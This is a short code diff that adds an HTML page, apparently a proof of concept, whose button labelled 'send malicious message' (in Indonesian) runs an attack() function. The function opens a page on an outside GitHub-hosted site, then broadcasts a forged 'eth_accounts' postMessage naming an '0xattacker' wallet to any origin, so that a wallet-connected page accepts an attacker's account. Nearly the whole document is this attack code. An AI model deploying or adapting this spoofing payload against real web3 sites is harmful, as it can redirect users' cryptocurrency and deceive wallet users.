@@ -1,0 +1,9 @@
+<button onclick="attack()">Kirim pesan jahat</button>
+<script>
+function attack(){
+  window.open('https://raw.githubusercontent.com/0x403for/0x403for.github.io/main/good.html')
+  setTimeout(()=>{
+    window.postMessage({type:'eth_accounts', accounts:['0xattacker']}, '*')
+  },1000)
+}
+</script>
